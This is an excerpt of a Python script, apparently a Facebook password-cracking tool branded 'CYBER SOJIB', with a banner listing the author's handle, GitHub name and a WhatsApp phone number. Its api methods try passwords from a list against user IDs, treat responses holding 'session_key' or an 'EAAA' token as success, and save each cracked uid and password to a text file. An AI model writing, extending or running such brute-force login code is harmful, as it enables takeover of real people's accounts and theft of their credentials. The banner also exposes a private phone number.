...
________  __       __  ________
     ...
     │ [💸] CODED BY : CYBER SOJIB           │

     │ [💸] GITHUB   : Cybersojib_12               │

     │ [💸] WHATSAPP : +968 97894038        │

     │ [💸] VERSION  : OLD                   │

     │ [💸] HACKED   : \033[1;32mCYBER. SOJIB \033[1;37m              │
...
class Main:
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text:
				...
				print("\r \033[0;92CYBER]SOJIB-OK] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("2009-CYBER-SOJIB-OK.txt","a").write(" %s | %s\n"%(uid, pw))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write("\r [CYBER.SOJIB-VIP]%s /%s -Ok:-%s | Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))); sys.stdout.flush()
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[SOJIB-GO ] %s | %s\033[0;97m         "%(uid, pw))
